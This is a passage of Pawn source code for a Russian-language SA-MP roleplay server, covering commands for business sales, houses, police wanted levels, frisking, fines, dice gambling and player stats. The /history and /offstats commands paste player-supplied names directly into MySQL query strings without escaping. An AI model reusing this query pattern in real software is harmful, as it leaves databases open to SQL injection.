					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner = '%s', buyprice = %i , product = %i, money = %i, oplata = %i WHERE id = '%d' LIMIT 1", BizzInfo[idx][bOwner], BizzInfo[idx][bBuyPrice], BizzInfo[idx][bProduct],BizzInfo[idx][bMoney], BizzInfo[idx][bOplata], idx);
					mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					UpdateBizz(idx);
				}
			}
			else full_++;
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится рядом с бизнесом!");
	if(full_ == 0) return SendClientMessage(playerid, COLOR_GREY, "Бизнес уже имеет владельца!");
	return 1;
}

CMD:sellmybiz(playerid, params[])
{
	ShowPlayerDialog(playerid, -1, DIALOG_STYLE_MSGBOX, "", "", "", "");
	if(PI[playerid][pCredit] != 0) return SendClientMessage(playerid, COLOR_RED, "Во время кредита Вам запрещено продавать имущество");

	if(GetPlayerBizz(playerid) == 0)
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы не владеете бизнесом!");

     else if(sscanf(params, "ii", params[0],params[1]))
	    return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sellmybiz [ ID ] [ Цена ]");

    if(GetPlayerBizz(params[0]) == 1)
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "У игрока уже есть бизнес!");
	if(params[1] < 1)
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "Не верная цена!");
	if(params[1] > 99999999)
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "Не верная цена!");

	new i = GetPVarInt(playerid, "PlayerBizz");
	SetPVarInt(params[0], "sellbiz",1);
   	SetPVarInt(params[0], "bizzid", i);
	SetPVarInt(params[0], "price_bizz", params[1]);
	SetPVarInt(params[0], "idsellplayerbiz",playerid);

	new string[144];
	format(string, sizeof(string), "Вы предложили {FFCC00}%s {1D99D4}купить Ваш бизнес за {FFCC00}%i {1D99D4}рублей", PI[params[0]][pName], params[1]);
	SendClientMessage(playerid, COLOR_BLUE, string);
	format(string, sizeof(string), "Игрок {FFCC00} %s {1D99D4}предлагает купить Вам  его бизнес за {FFCC00}%i {1D99D4}рублей", PI[playerid][pName], params[1]);
	SendClientMessage(params[0], COLOR_BLUE, string);
	SendMess(params[0], MSG_PLAYER_ACCESS);

	return 1;
}

CMD:play(playerid)
{
    new ok=0;
    for(new s = 16; s > 0; s --)
    {
        if(PlayerItem1[playerid][s]==40){ok=s;break;}
    }
    if(ok==0){return SendClientMessage(playerid,COLOR_GREY,"У Вас нет плеера MP3!");}
	ShowPlayerDialog(playerid, 9345, DIALOG_STYLE_LIST, "Выберите радиостанцию", "1. Радио Шансон\n2. Наше Радио\n3. Радио Рекорд\n4. Зайцев.FM (Pop)\n5. Зайцев.FM (RnB)\n6. Выключить радио", "Выбор", "Выход");
	return 1;
}

CMD:garage(playerid)
{
	if(!GetPlayerGarage(playerid)) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет гаража");

	ShowPlayerDialog(playerid, DIALOG_GARAGE_MENU, DIALOG_STYLE_LIST, "{FFCD00}Управление гаражом", "1. Продать государству {FFFF00}(80 проц. стоимости)\n2. Найти на GPS", "Далее", "Отмена");

	return 1;
}

CMD:home(playerid) return callcmd::hmenu(playerid);
CMD:hmenu(playerid)
{
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома!");
	new i = GetPVarInt(playerid, "PlayerHouse");
	if(strcmp(GetName(playerid), HouseInfo[i][hOwner], true) == 0)
	{
		if((IsPlayerInRangeOfPoint(playerid,60.0,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]) || IsPlayerInRangeOfPoint(playerid,3.0,2934.4077,2967.4949,3176.5769)) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][hVirtual])
		{
		    new string[400];
		    format(string, sizeof(string), "{ffffff}\
			{0099FF}1. {FFFFFF}Открыть / закрыть дом\n\
			{0099FF}2. {FFFFFF}Гардероб\n\
			{0099FF}3. {FFFFFF}Оплачен на: {FFAA44}%d / 10 дней\n{FFFFFF}\
			{0099FF}4. {FFFFFF}Аптечек в доме: {FFAA44}%i шт\n{FFFFFF}\
			{0099FF}5. {FFFFFF}Улучшения дома\n\
			{0099FF}6. {FFFFFF}Продать дом", HouseInfo[i][hOplata], HouseInfo[i][hHeal]);
			ShowPlayerDialog(playerid, D_HOME, 2, "Панель управления домом", string, "Принять", "Отмена");
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в вашем доме!");
	}
	return 1;
}

CMD:getbizstats(playerid, params[])
{
	new full = 0;
	for(new i = TOTALBIZZ; i > 0; i --)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx],BizzInfo[i][bEntry],BizzInfo[i][bEntrz]))
		{
			//if(!strcmp(BizzInfo[i][bOwner],"None",true)) return SendClientMessage(playerid, COLOR_GREY, "Бизнес не имеет владельца!");
			BizzStats(playerid, i);
			full++;
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с бизнесом!");
	return 1;
}

CMD:bizlist(playerid, params[])
{
	if(!IsAMafia(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	SendClientMessage(playerid, COLOR_GREEN, "Завоеванные бизнесы:");
	new string[128];
	for(new h = TOTALBIZZ; h >= 0; h --)
	{
		new mafiapay = BizzPay[h] / 10;
		switch(PI[playerid][pMember])
		{
			case TEAM_RSM:
			{
				if(BizzInfo[h][bControl] == TEAM_RSM)
				{
				    format(string, sizeof(string), "- %s, прибыль: %d", BizzInfo[h][bName], mafiapay);
					SendClientMessage(playerid, COLOR_YELLOW2, string);
				}
			}
			case TEAM_OPG1:
			{
				if(BizzInfo[h][bControl] == TEAM_OPG1)
				{
				    format(string, sizeof(string), "- %s, прибыль: %d", BizzInfo[h][bName], mafiapay);
					SendClientMessage(playerid, COLOR_YELLOW2, string);
				}
			}
		}
	}
	return 1;
}

CMD:break(playerid, params[])
{
    if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в Полиции/ФБР");
    else if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Нельзя использовать в машине");
    if(GetPVarInt(playerid,"objectcop"))
    {
        DestroyObject(GetPVarInt(playerid,"objectcop"));
		DeletePVar(playerid, "objectcop");
		SendClientMessage(playerid, COLOR_RED, "Вы убрали установленный объект");
        if(Ships[playerid]) DestroyDynamicArea(Ships[playerid]);
		return 1;
    }
    ShowPlayerDialog(playerid, D_BREAK, DIALOG_STYLE_LIST, "Установка объекта", "Шипы\nОграждение №1\nОграждение №2\nОграждение №3", "Выбрать", "Отмена");
    return 1;
}

CMD:flight(playerid, params[])
{
    if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA)
	{
	   if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "Нельзя использовать в машине.");
       else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /flight [тип 1-2]");
       if(params[0] == 0)
       {
           if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		   if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
		   SendClientMessage(playerid, COLOR_LIGHTGREEN, "Вы спрятали фонарик в карман.");
       }
       else if(params[0] == 1)
	   {
	       if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	       if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
	       SendClientMessage(playerid, COLOR_LIGHTGREEN, "Вы достали фонарик малой дальности!");
	       SetPlayerAttachedObject(playerid, 1, 18656, 5, 0.1, 0.038, -0.1, -90.0, 180.0, 0.0, 0.03, 0.03, 0.03);
	       return SetPlayerAttachedObject(playerid, 2, 18641, 5, 0.1, 0.02, -0.05, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0);
       }
       else if(params[0] == 2)
       {
	       if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	       if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
	       SendClientMessage(playerid, COLOR_LIGHTGREEN, "Вы достали фонарик повышенной дальности!");
	       SetPlayerAttachedObject(playerid, 1, 18656, 5, 0.1, 0.038, -0.01, -90.0, 180.0, 0.0, 0.03, 0.1, 0.03);
	       return SetPlayerAttachedObject(playerid, 2, 18641, 5, 0.1, 0.02, -0.05, 0.0, 0.0, 0.0, 1.0, 1.0, 1.0);
       }
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:su(playerid, params[]) return callcmd::suspect(playerid, params);
CMD:suspect(playerid, params[])
{
	if(!IsACop(playerid) || PI[playerid][pRank] < 5) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "us[24]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /suspect [id игрока] [причина]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
	else if(IsACop(params[0]) || PI[params[0]][pMember] == TEAM_ARMIYA) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
	else if(PI[playerid][pMember] != TEAM_FBI && PI[params[0]][pWanted] >= 3) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете дать более 3-ех звезд!");
	else if(PI[playerid][pMember] == TEAM_FBI && PI[params[0]][pWanted] >= 6) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете дать более 6-ти звезд!");
	PI[params[0]][pWanted]++;
	if(PI[params[0]][pWanted]-1 == 0) PI[params[0]][pWantedTime] = 1800 + random(300);
	SetPlayerWantedLevel(params[0],PI[params[0]][pWanted]);
	SetPlayerCriminal(params[0], GetName(playerid), params[1]);
	MysqlUpdatePlayerInt(params[0], "wanted", PI[params[0]][pWanted]);
	MysqlUpdatePlayerInt(params[0], "wantedtime", PI[params[0]][pWantedTime]);
	return 1;
}

CMD:frisk(playerid, params[])
{
	if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /frisk [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете обыскать себя!");
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		SendMes(playerid, COLOR_WHITE, "Имущество %s", GetName(params[0]));
		SendMes(playerid, COLOR_GREY, "- %s", (PI[params[0]][pPatron]) ? ("Патроны") : ("Пусто"));
		SendMes(playerid, COLOR_GREY, "- %s", (PI[params[0]][pGunAmount]) ? ("Металла") : ("Пусто"));
		SendMes(playerid, COLOR_GREY, "- %s", (PI[params[0]][pDrugs]) ? ("Наркотики") : ("Пусто"));
		new string[100];
		if(PI[playerid][pSex] == 1) format(string, sizeof(string), "достал перчатки и обыскал %s", GetName(params[0]));
		else format(string, sizeof(string), "достала перчатки и обыскала %s", GetName(params[0]));
		MeAction(playerid, string);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:ticket(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "iis[24]", params[0], params[1], params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ticket [id игрока] [сумма] [причина]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(params[1] < 1 || params[1] > 10000) return SendClientMessage(playerid, COLOR_GREY, "Сумма штрафа от 1р до 10000р");
	SendMes(playerid, COLOR_BLUE, "Вы выписали штраф %s в размере %dр. Причина: %s", GetName(params[0]), params[1], params[2]);
	SendMes(params[0], COLOR_BLUE, "Офицер %s выписал вам штраф в размере %dр. Причина: %s", GetName(playerid), params[1], params[2]);
	WritePlayerFine(params[0], params[1], params[2]);
	return 1;
}

CMD:maprecord(playerid, params[]) return Kick(playerid);

CMD:dice(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 70.0, 1683.0164,2068.7957,-7.5341))
	{
	    if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, COLOR_LIME, "Информация: {ffffff}/dice [ид игрока] [сумма]");
     	if(KostiMoney[playerid] != 0 || ZapretDice[playerid] != 0) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вам уже предложили игру!");
	    if(GetPVarInt(playerid, "casinotime") > gettime() || GetPVarInt(params[0], "casinotime") > gettime()) return SendClientMessage(playerid, COLOR_LIME, "Играть можно раз в 15 сек");
	    if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, C_RED, "Такого игрока нет");
	    if(params[1] < 500 || params[1] > 1000000) return SendClientMessage(playerid, COLOR_DARKORANGE, "Минимальная ставка 500 рублей, максимальная 1 000 000 рублей");
	    if(ZapretDice[params[0]] == 1) return SendClientMessage(playerid, COLOR_DARKORANGE, "В данный момент игрок не может играть!");
		if(!ProxDetectorS(6.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_DARKORANGE, "Игрок не рядом с Вами!");
  		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_DARKORANGE, "Самому себе нельзя предлагать игру");
	    new string[128];
	    format(string, sizeof(string), "Вы предложили {ffc400}%s {1D99D4}бросить кости на {ffc400}%i рублей", GetName(params[0]), params[1]);
	    SendClientMessage(playerid, COLOR_BLUE, string);
	    format(string, sizeof(string), "{ffc400}%s {1D99D4} предлагает Вам бросить кости. Ставка: {ffc400}%i рублей", GetName(playerid), params[1]);
	    SendClientMessage(params[0], COLOR_BLUE, string);
	    SendClientMessage(params[0], COLOR_WHITE, "{FFFFFF}Нажмите {03c03c}Y {FFFFFF}чтобы согласиться или {ff7518}N {FFFFFF}для отказа.");
	    ZapretDice[playerid] = ZapretDice[params[0]] = 1;
	    KostiName[playerid] = params[0];
	    KostiName[params[0]] = playerid;
	    KostiMoney[params[0]] = params[1];
	    KostiMoney[playerid] = params[1];
	    Predlog[playerid] = 1;
    	SetPVarInt(playerid, "casinotime", gettime()+15);
	}
	else
	{
		SendClientMessage(playerid, COLOR_DARKORANGE, "Вы должны находиться у игрового слота!");
	}
    return 1;
}
CMD:canceldice(playerid)
{
    if(KostiName[playerid] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы не предлагали никому игру!");
	Predlog[playerid] = Predlog[KostiName[playerid]] =
	KostiMoney[playerid] = KostiMoney[KostiName[playerid]] =
	ZapretDice[playerid] = ZapretDice[KostiName[playerid]] = 0;
	SendClientMessage(KostiName[playerid], COLOR_RED, "Игрок отказался от ставки!");
	SendClientMessage(playerid, COLOR_RED, "Вы отказались играть!");
	KostiName[KostiName[playerid]] = KostiName[playerid] = INVALID_PLAYER_ID;
	return true;
}

CMD:history(playerid, params[])
{
	new nickname[MAX_PLAYER_NAME];
	if(sscanf(params, "s[90]", nickname)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /history [имя игрока]");
	new string[128];
	format(string, sizeof(string), "SELECT `id` FROM "T_ACCOUNTS" WHERE `name` = '%s'", nickname);
	mysql_tquery(dbHandle, string, "OnPlayerHistoryName", "d", playerid);
	return 1;
}

CMD:hunger(playerid)
{
	new string[256], Stats_Level[40];
	switch(PI[playerid][pHunger])
	{
	    case 81..100: Stats_Level = "{63BD4E}[Вы сыты]";
	    case 51..80: Stats_Level = "{CCFF00}[Вы сыты]";
	    case 31..50: Stats_Level = "{FDE910}[Вы немного проголодались]";
	    case 16..30: Stats_Level = "{FF8800}[Вы голодны]";
	    case 0..15: Stats_Level = "{FF0600}[Вы очень голодны]";
	}
	format(string, sizeof(string), "{FFFFFF}%d%% %s\n\n{FFFFFF}Пополнить сытость можно в любой закусочной города\nЕсли долго не есть ваше здоровье начнет ухудшаться", PI[playerid][pHunger], Stats_Level);
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Уровень сытости игрока", string, "Закрыть", "");
	return 1;
}

CMD:stats(playerid)
{
    ShowPlayerStatsDialog(playerid, playerid);
	return 1;
}
CMD:offstats(playerid, params[])
{
	if(PI[playerid][pAdmin] < 2) return 1;

	if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offstats [ник]");

	new length = strlen(params);
	if(!(5 <= length <= MAX_PLAYER_NAME))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offstats [ник]");

	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(dbHandle, STRING_GLOBAL, "LoadPlayerStats", "is", playerid, params);
	return 1;
}

forward LoadPlayerStats(playerid, name[]);
public LoadPlayerStats(playerid, name[])
{
	if(!cache_num_rows())
		return SendClientMessage(playerid, COLOR_GREY, "Игрока с указанным Вами именем не найдено.");

	new
		level 			= cache_get_field_content_int(0, "level", dbHandle),
		exp				= cache_get_field_content_int(0, "exp", dbHandle),
		age				= cache_get_field_content_int(0, "age", dbHandle),
		warn			= cache_get_field_content_int(0, "warn", dbHandle),
		check_time		= cache_get_field_content_int(0, "checktime", dbHandle),
		sex				= cache_get_field_content_int(0, "sex", dbHandle),
		voennik			= cache_get_field_content_int(0, "Voennik", dbHandle),
		zakon			= cache_get_field_content_int(0, "zakon", dbHandle),
		money			= cache_get_field_content_int(0, "cash", dbHandle),
		bank			= cache_get_field_content_int(0, "bank", dbHandle),
		wanted			= cache_get_field_content_int(0, "wanted", dbHandle),
		number			= cache_get_field_content_int(0, "phonenumber", dbHandle),
		job				= cache_get_field_content_int(0, "job", dbHandle),
		member			= cache_get_field_content_int(0, "member", dbHandle),
		rank			= cache_get_field_content_int(0, "rank", dbHandle),
		fracwarn		= cache_get_field_content_int(0, "fracwarn", dbHandle),
		credits			= cache_get_field_content_int(0, "credits", dbHandle),
		id				= cache_get_field_content_int(0, "id", dbHandle),
		admin			= cache_get_field_content_int(0, "admin", dbHandle),
		vip				= cache_get_field_content_int(0, "vip", dbHandle);

	new phone_text[20] = "не имеется", whomarried[MAX_PLAYER_NAME];
	if(number > 1) format(phone_text, sizeof phone_text, "%i", number);

	cache_get_field_content(0, "whomarried", whomarried, MAX_PLAYER_NAME);

	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{FFFFFF}Имя:\t\t\t{0099FF}%s\n", name);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s{FFFFFF}Уровень:\t\t\t{FFAA44}%d\n", STRING_GLOBAL, level);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s{FFFFFF}Опыт:\t\t\t\t{FFAA44}%d / %d\n", STRING_GLOBAL, exp, (level+1)*4);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s{FFFFFF}Возраст:\t\t\t%d\n", STRING_GLOBAL, age);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s{FFFFFF}Предупреждения:\t\t%d / 3\n", STRING_GLOBAL, warn);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sОтыграно:\t\t\t%s\n", STRING_GLOBAL, Converts(check_time));
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sСлужил%s:\t\t\t%s\n", STRING_GLOBAL, (sex == 1) ? ("") : ("а"), (voennik == 1) ? ("да") : ("нет"));
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sЗаконопослушность:\t\t%d\n", STRING_GLOBAL, zakon);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sНаличные:\t\t\t%dр\n", STRING_GLOBAL, money);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sБанк:\t\t\t\t%dр\n", STRING_GLOBAL, bank);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sРозыск:\t\t\t%d\n", STRING_GLOBAL, wanted);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sНомер телефона:\t\t%s\n", STRING_GLOBAL, phone_text);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s%s на:\t\t\t%s\n", STRING_GLOBAL, (sex == 1) ? ("женат") : ("замужем"), whomarried);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sПол:\t\t\t\t%s\n", STRING_GLOBAL, (sex == 1) ? ("мужской") : ("женский"));
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sРабота:\t\t\t\t%s\n", STRING_GLOBAL, Job_Names[job]);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sОрганизация:\t\t\t%s\n", STRING_GLOBAL, (member == 0) ? ("нет") : (Fraction_Name[member]));
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sДолжность:\t\t\t%s\n", STRING_GLOBAL, (rank == 0) ? ("нет") : (Fraction_Rang[member][rank]));
	if(member > 0){
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sВыговоров:\t\t\t{FFFFFF}%d/{FF0000}3{FFFFFF}\n", STRING_GLOBAL, fracwarn);
	}

	new bool:status1 = false;
	for(new i = TOTALBIZZ; i > 0; i--)
	{
		if(!strcmp(BizzInfo[i][bOwner], name, true) && !isnull(BizzInfo[i][bOwner]))
		{
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sБизнес:\t\t\t%s (%d)\n", STRING_GLOBAL, BizzInfo[i][bName], i);
			status1 = true;
			break;
		}
	}
	if(status1 == false){
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sБизнес:\t\t\tНет\n", STRING_GLOBAL);
	}

	new bool:status2 = false;
	for(new i = TOTALHOUSE; i > 0; i--)
	{
		if(!strcmp(HouseInfo[i][hOwner], name, true) && !isnull(HouseInfo[i][hOwner]))
		{
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sДом:\t\t\t\t№%d\n", STRING_GLOBAL, i);
			status2 = true;
			break;
		}
	}
	if(status2 == false)
	{
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sДом:\t\t\t\tНет\n", STRING_GLOBAL);
	}
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sКредитов:\t\t\t%d\n", STRING_GLOBAL, credits);
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%sНомер аккаунта:\t\t%d\n", STRING_GLOBAL, id);

	if(admin > 0){
		strcat(STRING_GLOBAL, "Статус:\t\t\t\tАдминистратор\n");
	}
	else if(vip > 0){
		strcat(STRING_GLOBAL, "Статус:\t\t\t\tVIP");
	}
	else{
		strcat(STRING_GLOBAL, "Статус:\t\t\t\tИгрок");
	}

	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Статистика персонажа", STRING_GLOBAL, "Закрыть", "");
	return 1;
}

CMD:mn(playerid, params[]) return callcmd::menu(playerid, params);
CMD:mm(playerid, params[]) return callcmd::menu(playerid, params);
CMD:mainmenu(playerid, params[]) return callcmd::menu(playerid, params);
CMD:menu(playerid, params[])
{
  	ShowPlayerDialog
	(
		playerid, DIALOG_PLAYER_MENU, DIALOG_STYLE_LIST,
		"{FFFFFF}Меню персонажае",
		"{FFFFFF}1. Статистика\n"\
		"{FFFFFF}2. Команды сервера\n"\
		"{FFFFFF}3. Личные настройки\n"\
		"{FFFFFF}4. Настройки безопастности\n"\
		"{FFFFFF}5. Связь с Администрацией\n"\
		"{FFFFFF}6. Улучшения\n"\
		"{FFFFFF}7. Правила сервера\n"\
		"{FFFFFF}8. Изменить имя\n"\
		"{FFFFFF}9. Дополнительные услуги\n"\
		"{FFFFFF}10. Промокод",
		"Выбрать", "Выйти"
	);

	return 1;
}
/*CMD:faq(playerid, params[]);//Егор
{
        ShowPlayerDialog(playerid, D_APANEL, 2, "FAQ", "\
		{ffffff}Доступные FAQ: РП, ДБ, ИС , ООС, ПГ, МГ\n\
  		{ffffff}|___________________________________________________|\n\
  		{ffffff}|____________________ Role Play ____________________|\n\
        {ffffff} Четкий отыгрыш своей роли на сервере. При отыгрыше используется специальная команда '/me'.\n\
        {ffffff} Так же, в 'RP-мире' вы - неотъемлемая часть всей жизни. Вы можете быть кем угодно,\n\
        {ffffff} криминальным авторитетом, продажным полицейским, фермером, агентом недвижимости - решать Вам.\n\
        {ffffff}|___________________________________________________|\n\
        {ffffff}|_____________________ Drive-By ____________________|\n\
        {ffffff} Убийство любого игрока с водительского места. Убийство игроком другого игрока с сиденья\n\
	    {ffffff} пассажира не считается DB. Так же, если Вы наехали на игрока и ваш транспорт находился\n\
	    {ffffff} на нём пока он не умер, то это тоже называется DB.Увидев на сервере нарушителей этого\n\
	    {ffffff} пункта, так же оповестите администрацию.\n\
        {ffffff}|___________________________________________________|\n\
	    {ffffff}|________________ In Character(IC) ________________|\n\
   	    {ffffff} Это то, что Ваш персонаж (чар) может узнать только в игре. Не на форуме, не в /b-чате,\n\
	    {ffffff} не по телефону от друга и т.д., а только RP-информация. Пример - когда убили Вашего\n\
	    {ffffff} персонажа, и скрины с Вашей смертью выложили на форуме, любой другой игрок не может\n\
	    {ffffff} знать этого, т.к. скрины выложили на форум, а не рассказали Вам в игре. Примечание: На форум\n\
        {ffffff}можно выложить и IC-информацию, заранее предупредив других посетителей форума об этом.\n\
        {ffffff}|___________________________________________________|\n\
        {ffffff}{ffffff}|______________ Out Of Character(ООС) ______________|\n\
	    {ffffff} Информация, которую Ваш персонаж может узнать на форуме, у друга, в /b-чате. Нельзя\n\
	    {ffffff} перемешивать OOC-инфо и IC-инфо, т.к. это может испортить процесс игры. Для OOC-чата\n\
	    {ffffff} используется команда /b или /o. Все что вы написали в обычный чат, является IC-информацией.\n\
	    {ffffff} Все что в /b - OOC-информацией. С помощью OOC-чата игроки договариваются обо всех\n\
	    {ffffff} тонкостях отыгрыша. Например - в /b-чате можно договориться, чтобы Вас не убивали,\n\
	    {ffffff} а просто избили до полусмерти, дабы не создавать Вам нового персонажа.\n\
        {ffffff}|___________________________________________________|\n\
        {ffffff}|__________________ Powergaming __________________|\n\
	    {ffffff} Случай, когда вы считаете себя 'сильнее всех' и идете с одним автоматом на 2-3 игроков (пример).\n\
	    {ffffff} В реальной жизни вы не сможете этого сделать, Вас сразу же убьют. Тут то же самое.\n\
	    {ffffff} Для того чтобы не было пауэргейминга на этих игроков вы должны идти минимум с еще одним\n\
        {ffffff} ооруженным игроком. Так же на пауэргейминг вы можете подать жалобу через команду /report.\n\
        {ffffff}|_________________________________________________|\n\
        {ffffff}|__________________ Metagaming __________________|\n\
	    {ffffff} Использование информации, которую ваш персонаж не знает 'по-РП'. Например, ники над головой,\n\
	    {ffffff} имена на скриншотах. Информация, услышанная в ООС (/o; /b-чатах). Использование метагейминга\n\
	    {ffffff} наказывается. Вы так же можете подать жалобу о метагейминге через команду /report.\n\
        {ffffff}|________________________________________________|"};
}*/

CMD:help(playerid) return callcmd::cmd(playerid);
CMD:cmd(playerid)
{
    ShowPlayerDialog(playerid, D_COMMANDSERVER, DIALOG_STYLE_LIST, "Команды сервера", "\
	1. Основные\n\
	2. Чат\n\
	3. Дом\n\
	4. Бизнес\n\
	5. Транспорт\n\
	6. По работе\n\
	7. Для лидеров\n\
	8. Организация\n\
	9. Горячие клавиши\n\
	10. Семья", "Выбрать", "Назад");
	return 1;
}

CMD:ruletka(playerid)
{
	ShowPlayerDialog(playerid, 1613, DIALOG_STYLE_LIST, "Типы Рулетки", "1. Донат рулетка\t {63BD4E}(100 кредитов)\n2. Денежная рулетка\t {63BD4E}(150 кредитов)\nИнформация", "Выбрать", "Отмена");
	return 1;
}

CMD:viphelp(playerid)
{
	if(!PI[playerid][pVip]) return SendClientMessage(playerid, COLOR_GREY, "Вы не имеете VIP статус");
	new str[68], string[576];
	new year, month, day;
	new current_date = getdate(year, month, day);
	new time_left = PI[playerid][pVipTime] - current_date;
	format(str, sizeof(str), "{FFFF00}Вы владеете VIP статусом. Осталось дней: %i\n\n", time_left);
	strcat(string, str);
	strcat(string, "{FFFFFF}Ниже приведены ваши преимущества.\n");
	strcat(string, "1) Ускоренное лечение в больнице\n");
	strcat(string, "2) Удаление тюнинга с личного транспорта (/rtune)\n");
	strcat(string, "3) Возможность покинуть организацию самому (/leave)\n");
	strcat(string, "4) Каждую 4-ую зарплату +1 респект\n");
	strcat(string, "5) Прокачка скиллов в 2 раза быстрей\n");
	strcat(string, "6) Проявление чувства голода у персонажа в 2 раза реже\n");
	strcat(string, "7) Уменьшенное время на отправку вопроса/репорта\n");
